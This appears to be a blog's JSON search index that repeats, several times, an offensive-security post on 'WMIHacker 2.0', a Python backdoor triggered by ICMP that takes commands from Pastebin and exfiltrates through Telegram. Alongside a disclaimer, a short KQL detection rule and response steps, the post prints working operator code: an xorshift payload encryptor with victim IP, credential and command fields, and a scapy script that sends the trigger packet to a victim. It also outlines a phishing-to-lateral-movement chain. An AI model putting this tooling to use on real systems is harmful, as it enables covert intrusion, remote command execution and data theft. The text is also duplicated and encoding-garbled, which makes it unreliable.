infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = 